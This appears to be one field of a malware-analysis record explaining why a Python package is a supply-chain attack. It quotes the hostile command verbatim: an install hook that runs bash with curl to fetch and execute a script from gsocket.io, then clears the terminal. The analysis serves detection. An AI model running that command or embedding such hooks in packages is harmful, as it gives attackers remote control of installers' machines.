      "malicious_behavior": "This code is malicious and exhibits several high-confidence indicators of supply chain attack and remote code execution. Specifically: (1) It defines a custom setuptools install command (EUNtHHVLXEnghdLsQFGLxoYMyxErczrD) that, during package installation, calls dRVxUfWDpOGFSZSgOEiOfRASHGVjAgjP(). (2) This function executes a shell command via os.system that sets an environment variable and then runs bash -c \"$(curl -fsSL gsocket.io/x)\". This command downloads and executes a remote script from gsocket.io, a non-standard, suspicious domain, without user consent or validation. (3) The code is obfuscated with meaningless variable and class names, a common malware tactic. (4) The malicious payload is triggered automatically during installation, a hallmark of supply chain attacks. (5) There is no legitimate business logic, user interaction, or documentation justifying this behavior. (6) The code attempts to clear the terminal (os.system('clear')) after execution, likely to hide evidence. All these behaviors are strongly associated with malware and are never observed in benign Python packages.",
